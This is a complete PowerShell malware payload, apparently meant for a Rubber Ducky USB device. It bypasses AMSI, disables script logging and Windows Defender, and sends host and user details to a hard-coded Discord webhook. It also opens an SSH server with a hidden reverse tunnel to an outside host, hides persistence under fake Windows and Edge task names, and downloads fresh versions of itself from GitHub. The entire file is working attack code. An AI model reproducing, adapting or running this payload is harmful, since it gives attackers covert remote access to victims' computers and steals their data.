# ==========================================
# Rubber Ducky Autonomous Payload
# Version: 4.1
# Architecture: Single-file, modular design
# Added: Reverse SSH Tunnel Support
# ==========================================

#region AMSI_BYPASS
try {
    $amsiContext = [Ref].Assembly.GetType(
        'System.Management.Automation.AmsiUtils'
    )
    $amsiField = $amsiContext.GetField(
        'amsiInitFailed',
        'NonPublic,Static'
    )
    $amsiField.SetValue($null, $true)
} catch {}
#endregion

#region LOGGING_DISABLE
try {
    $settings = [Ref].Assembly.GetType(
        'System.Management.Automation.Utils'
    ).GetField(
        'cachedGroupPolicySettings',
        'NonPublic,Static'
    ).GetValue($null)
    
    if ($settings['ScriptBlockLogging']) {
        $settings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
        $settings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
    }
} catch {}
#endregion

#region CONFIGURATION
$script:Config = @{
    WebhookUrl = "https://discord.com/api/webhooks/1447469984732155906/zv5KY2ELOFqR9kFSfmpMVEDqEqvACPcoxH-g0C2tvYG4a4-Y1DPKwzQr4VeUtVQaTncO"
    GithubUser = "Zoex2304"
    GithubRepo = "dcpyld"
    Version = "4.1"
    RemoteHost = "ssh.autovoid.cyou"
    RemotePort = 2222
}

$script:Paths = @{
    AppDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
    Script = "$env:APPDATA\Microsoft\Windows\SystemCache\svchost.ps1"
}
#endregion

#region SYSTEM_INFO_COLLECTOR
class SystemInfoCollector {
    [hashtable] Collect() {
        return @{
            PublicIP = $this.GetPublicIP()
            LocalIP = $this.GetLocalIP()
            Gateway = $this.GetGateway()
            Hostname = $env:COMPUTERNAME
            Username = $env:USERNAME
            Domain = $env:USERDOMAIN
            OS = $this.GetOSVersion()
            IsAdmin = $this.CheckAdmin()
            Antivirus = $this.GetAntivirus()
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
    }
    
    [string] GetPublicIP() {
        try {
            return (Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -TimeoutSec 5).ip
        } catch {
            try {
                return (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 5)
            } catch {
                return "Unknown"
            }
        }
    }
    
    [string] GetLocalIP() {
        try {
            $ip = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
                  Where-Object { 
                      $_.InterfaceAlias -notlike "*Loopback*" -and 
                      $_.IPAddress -notlike "169.254.*" 
                  } | 
                  Select-Object -First 1 -ExpandProperty IPAddress
            return $ip
        } catch {
            return "Unknown"
        }
    }
    
    [string] GetGateway() {
        try {
            return (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | 
                   Select-Object -First 1).NextHop
        } catch {
            return "Unknown"
        }
    }
    
    [string] GetOSVersion() {
        try {
            return (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        } catch {
            return "Unknown"
        }
    }
    
    [bool] CheckAdmin() {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = [Security.Principal.WindowsPrincipal]$identity
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    
    [string] GetAntivirus() {
        try {
            $av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue | 
                  Select-Object -First 1 -ExpandProperty displayName
            return $av
        } catch {
            return "Unknown"
        }
    }
}
#endregion

#region DISCORD_EXFILTRATOR
class DiscordExfiltrator {
    [string] $WebhookUrl
    
    DiscordExfiltrator([string]$url) {
        $this.WebhookUrl = $url
    }
    
    [bool] SendSystemInfo([hashtable]$data) {
        $payload = $this.BuildPayload($data)
        return $this.SendToWebhook($payload)
    }
    
    [hashtable] BuildPayload([hashtable]$data) {
        return @{
            embeds = @(@{
                title = "Target Compromised"
                color = 3066993
                fields = @(
                    @{name="Public IP"; value="``$($data.PublicIP)``"; inline=$true}
                    @{name="Local IP"; value="``$($data.LocalIP)``"; inline=$true}
                    @{name="Gateway"; value="``$($data.Gateway)``"; inline=$true}
                    @{name="Hostname"; value="``$($data.Hostname)``"; inline=$true}
                    @{name="User"; value="``$($data.Domain)\$($data.Username)``"; inline=$true}
                    @{name="Admin"; value="$($data.IsAdmin)"; inline=$true}
                    @{name="OS"; value="$($data.OS)"; inline=$false}
                    @{name="Antivirus"; value="$($data.Antivirus)"; inline=$true}
                    @{name="Timestamp"; value="$($data.Timestamp)"; inline=$false}
                )
                timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
            })
        }
    }
    
    [bool] SendToWebhook([hashtable]$payload) {
        try {
            $json = $payload | ConvertTo-Json -Depth 10
            Invoke-RestMethod -Uri $this.WebhookUrl -Method Post -Body $json -ContentType "application/json" -UseBasicParsing | Out-Null
            return $true
        } catch {
            return $false
        }
    }
}
#endregion

#region DEFENDER_MANAGER
class DefenderManager {
    [bool] $IsAdmin
    
    DefenderManager([bool]$isAdmin) {
        $this.IsAdmin = $isAdmin
    }
    
    [bool] DisableDefender() {
        if (-not $this.IsAdmin) {
            return $false
        }
        
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop
            Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop
            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction Stop
            Set-MpPreference -MAPSReporting 0 -ErrorAction Stop
            
            Add-MpPreference -ExclusionPath $script:Paths.AppDir -ErrorAction Stop
            Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
            
            return $true
        } catch {
            return $false
        }
    }
}
#endregion

#region SSH_SERVER_MANAGER
class SSHServerManager {
    [bool] $IsAdmin
    
    SSHServerManager([bool]$isAdmin) {
        $this.IsAdmin = $isAdmin
    }
    
    [bool] Setup() {
        if (-not $this.IsAdmin) {
            return $false
        }
        
        try {
            $service = Get-Service -Name sshd -ErrorAction SilentlyContinue
            
            if (-not $service) {
                Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop | Out-Null
            }
            
            Start-Service sshd -ErrorAction Stop
            Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction Stop
            
            $rule = Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue
            if (-not $rule) {
                New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction Stop | Out-Null
            }
            
            return $true
        } catch {
            return $false
        }
    }
}
#endregion

#region REVERSE_TUNNEL_MANAGER
class ReverseTunnelManager {
    [string] $RemoteHost
    [int] $RemotePort
    
    ReverseTunnelManager([string]$host, [int]$port) {
        $this.RemoteHost = $host
        $this.RemotePort = $port
    }
    
    [void] CreateTunnel() {
        try {
            $tunnelCmd = "ssh -N -R $($this.RemotePort):localhost:22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=nul -o ServerAliveInterval=60 -o ServerAliveCountMax=3 $env:USERNAME@$($this.RemoteHost)"
            
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -Command `"while(`$true) { try { $tunnelCmd } catch {} Start-Sleep -Seconds 10 }`"" -WindowStyle Hidden
            
        } catch {}
    }
}
#endregion

#region PERSISTENCE_MANAGER
class PersistenceManager {
    [string] $AppDir
    [string] $ScriptPath
    [string] $GithubRawUrl
    
    PersistenceManager([string]$appDir, [string]$scriptPath, [string]$githubUrl) {
        $this.AppDir = $appDir
        $this.ScriptPath = $scriptPath
        $this.GithubRawUrl = $githubUrl
    }
    
    [void] Setup() {
        $this.CreateHiddenDirectory()
        $this.DownloadScript()
        $this.AddRegistryPersistence()
        $this.AddScheduledTaskPersistence()
    }
    
    [void] CreateHiddenDirectory() {
        if (-not (Test-Path $this.AppDir)) {
            New-Item -Path $this.AppDir -ItemType Directory -Force -Attributes Hidden | Out-Null
        }
    }
    
    [void] DownloadScript() {
        try {
            Invoke-WebRequest -Uri $this.GithubRawUrl -OutFile $this.ScriptPath -UseBasicParsing -ErrorAction Stop
            (Get-Item $this.ScriptPath -Force).Attributes = 'Hidden,System'
        } catch {}
    }
    
    [void] AddRegistryPersistence() {
        try {
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $regName = "SecurityHealthSystray"
            $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$($this.ScriptPath)`""
            
            Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction Stop
        } catch {}
    }
    
    [void] AddScheduledTaskPersistence() {
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$($this.ScriptPath)`""
            $trigger = New-ScheduledTaskTrigger -AtLogOn
            $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            
            Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskUser" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
        } catch {}
    }
}
#endregion

#region UPDATE_MANAGER
class UpdateManager {
    [string] $ScriptPath
    [string] $GithubRawUrl
    
    UpdateManager([string]$scriptPath, [string]$githubUrl) {
        $this.ScriptPath = $scriptPath
        $this.GithubRawUrl = $githubUrl
    }
    
    [void] CheckAndUpdate() {
        try {
            if (-not (Test-Path $this.ScriptPath)) {
                return
            }
            
            $remoteContent = Invoke-WebRequest -Uri $this.GithubRawUrl -UseBasicParsing
            $localContent = Get-Content $this.ScriptPath -Raw
            
            if ($remoteContent.Content -ne $localContent) {
                $remoteContent.Content | Out-File -FilePath $this.ScriptPath -Force
                Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$($this.ScriptPath)`"" -WindowStyle Hidden
                exit
            }
        } catch {}
    }
    
    [void] ScheduleAutoUpdate() {
        try {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command `"& '$($this.ScriptPath)'`""
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration ([TimeSpan]::MaxValue)
            $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
            
            Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
        } catch {}
    }
}
#endregion

#region MAIN_ORCHESTRATOR
class AttackOrchestrator {
    [SystemInfoCollector] $InfoCollector
    [DiscordExfiltrator] $Exfiltrator
    [DefenderManager] $DefenderMgr
    [SSHServerManager] $SSHMgr
    [PersistenceManager] $PersistenceMgr
    [UpdateManager] $UpdateMgr
    [ReverseTunnelManager] $TunnelMgr
    [bool] $IsAdmin
    
    AttackOrchestrator() {
        $this.IsAdmin = $this.CheckAdminPrivilege()
        $this.InitializeComponents()
    }
    
    [bool] CheckAdminPrivilege() {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = [Security.Principal.WindowsPrincipal]$identity
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    
    [void] InitializeComponents() {
        $githubRawUrl = "https://raw.githubusercontent.com/$($script:Config.GithubUser)/$($script:Config.GithubRepo)/main/payload.ps1"
        
        $this.InfoCollector = [SystemInfoCollector]::new()
        $this.Exfiltrator = [DiscordExfiltrator]::new($script:Config.WebhookUrl)
        $this.DefenderMgr = [DefenderManager]::new($this.IsAdmin)
        $this.SSHMgr = [SSHServerManager]::new($this.IsAdmin)
        $this.PersistenceMgr = [PersistenceManager]::new($script:Paths.AppDir, $script:Paths.Script, $githubRawUrl)
        $this.UpdateMgr = [UpdateManager]::new($script:Paths.Script, $githubRawUrl)
        $this.TunnelMgr = [ReverseTunnelManager]::new($script:Config.RemoteHost, $script:Config.RemotePort)
    }
    
    [void] Execute() {
        $this.DefenderMgr.DisableDefender() | Out-Null
        
        $systemInfo = $this.InfoCollector.Collect()
        $this.Exfiltrator.SendSystemInfo($systemInfo) | Out-Null
        
        $this.SSHMgr.Setup() | Out-Null
        
        $this.PersistenceMgr.Setup()
        
        $this.UpdateMgr.ScheduleAutoUpdate()
        $this.UpdateMgr.CheckAndUpdate()
        
        $this.TunnelMgr.CreateTunnel()
    }
}
#endregion

#region EXECUTION_ENTRY_POINT
try {
    $orchestrator = [AttackOrchestrator]::new()
    $orchestrator.Execute()
} catch {}

exit
#endregion